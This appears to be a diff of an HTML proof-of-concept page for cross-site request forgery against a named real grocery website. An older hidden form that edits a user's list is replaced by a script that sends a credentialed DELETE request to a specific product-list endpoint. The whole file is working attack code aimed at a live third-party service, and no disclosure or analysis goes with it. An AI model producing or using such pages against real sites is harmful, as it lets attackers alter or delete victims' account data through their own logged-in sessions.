@@ -1,17 +1,42 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Simple CSRF PoC</title>
+  <meta charset="UTF-8" />
+  <title>CSRF PoC DELETE with fetch</title>
 </head>
 <body>
 
-  <h2>CSRF PoC</h2>
+<h2>CSRF PoC - DELETE request</h2>
 
-  <form action="https://www.mathem.se/se/account/lists/edit/" method="POST" enctype="multipart/form-data">
-    <input type="hidden" name="title" value="CSRF Attack">
-    <input type="hidden" name="description" value="Changed via CSRF">
-    <input type="submit" value="Submit CSRF">
-  </form>
+<button id="csrfBtn">Submit CSRF DELETE</button>
+
+<p id="status"></p>
+
+<script>
+  const btn = document.getElementById('csrfBtn');
+  const status = document.getElementById('status');
+
+  btn.addEventListener('click', () => {
+    fetch('https://www.mathem.se/tienda-web-api/v1/product-lists/617528/', {
+      method: 'DELETE',
+      credentials: 'include', // send cookies
+      headers: {
+        // Add headers if necessary
+      }
+    })
+    .then(response => {
+      status.textContent = `Response status: ${response.status}`;
+      return response.text();
+    })
+    .then(text => {
+      console.log('Response body:', text);
+    })
+    .catch(err => {
+      status.textContent = `Error: ${err}`;
+      console.error('Fetch error:', err);
+    });
+  });
+</script>
 
 </body>
 </html>
